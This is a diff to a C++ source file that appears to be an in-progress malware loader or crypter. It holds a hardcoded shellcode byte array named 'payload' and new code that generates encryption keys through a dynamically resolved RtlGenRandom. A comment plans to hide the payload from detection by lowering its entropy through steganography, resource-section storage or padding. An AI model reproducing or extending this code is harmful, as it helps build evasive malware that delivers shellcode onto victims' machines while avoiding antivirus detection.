@@ -1,5 +1,10 @@
 #include "../headers/encrypt_payload.h"
+#include <cstdlib>
+#include <ctime>
+#include <iostream>
 
+// todo:reduce entropy of thi by using steganography to hide in file, 
+// resource section or download and pad payload with repetitive bytes 
 unsigned char payload[] =
 "\x48\x31\xc9\x48\x81\xe9\xac\xff\xff\xff\x48\x8d\x05\xef"
 "\xff\xff\xff\x48\xbb\xdc\xae\xed\xe9\x52\x67\x22\x43\x48"
@@ -57,7 +62,6 @@ unsigned char payload[] =
 
 int main()
 {
-	NTSTATUS status = NULL;
 	
 	API::APIResolver &resolver = API::APIResolver::GetInstance();
 
@@ -66,7 +70,21 @@ int main()
 
 	API::API_ACCESS  api = resolver.GetAPIAccess();
 
+	NTSTATUS status = NULL;
 
+	Tools tools;
+
+	tools.EnableDebugConsole();
+
+	unsigned char key[KEYSIZE];
+	unsigned char iv [IVSIZE];
+
+	// Create random number
+	if (!NT_SUCCESS(status = api.func.pRtlGenRandom(key, KEYSIZE)))
+		tools.PrintConsole("rtlgenrandom failed");
+
+
+	//SecureZeroMemory(pKey, sizeof(szPassword));
 	return 0;
 }
 
